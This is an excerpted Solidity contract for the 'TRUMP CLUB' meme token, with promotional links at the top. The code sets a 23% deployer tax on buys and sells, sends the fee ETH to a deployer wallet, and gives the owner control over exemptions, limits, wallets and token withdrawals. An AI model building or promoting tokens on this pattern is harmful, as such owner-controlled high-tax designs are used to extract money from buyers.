...
Website     : https://trumpclub.xyz/
Telegram    : https://t.me/trumpclubvoters
Twitter     : https://x.com/TrumpClubVoters
...
contract TRUMPCLUB is Context, IERC20, Ownable {
    ...
    string private _name = "TRUMP CLUB";
    string private _symbol = "TRUMP";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress =
        payable(0xD2d1dBA9E835bC3700cB29013Ea51E26b4BeeCDf);
    ...
    uint256 public _buyDeployerFee = 23;

    uint256 public _sellLiquidityFee = 0;
    uint256 public _sellMarketingFee = 0;
    uint256 public _sellDeployerFee = 23;

    uint256 public _liquidityShare = 0;
    uint256 public _marketingShare = 0;
    uint256 public _deployerShare = 10;
    ...
    uint256 public _walletMax       = 4206900000 * 10**_decimals;
    uint256 private minimumTokensBeforeSwap = 2109450000 * 10**_decimals;
    ...
    function TrumpclubExcludeMaxTx(address holder, bool exempt)
        external
        onlyOwner
    {
    ...
    function TrumpclubExcludedFromFee(address account, bool newValue)
        public
        onlyOwner
    {
    ...
    function TrumpclubSetMax(uint256 maxTxAmount, uint256 MaxLimit) external onlyOwner {
    ...
    function TrumpclubExludeMaxWallet(address holder, bool exempt)
        external
        onlyOwner
    {
    ...
    function TrumpclubMarketingWallet(address newAddress) external onlyOwner {
        marketingWalletAddress = payable(newAddress);
    }

    function TrumpclubDeployerWallet(address newAddress) external onlyOwner {
    ...
    function TrumpclubTransferTokenBalance(address _token, address _to, uint _value) external onlyOwner returns(bool _sent){
        if(_value == 0) {
    ...
    function TrumpclubSwapBalance() external onlyOwner {
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        uint256 amountETHLiquidity = amountReceived
            ...
            .div(totalETHFee)
            .div(2);
        uint256 amountETHDeployer = amountReceived.mul(_deployerShare).div(totalETHFee);
        ...
        if (amountETHDeployer > 0)
            transferToAddressETH(deployerWalletAddress, amountETHDeployer);
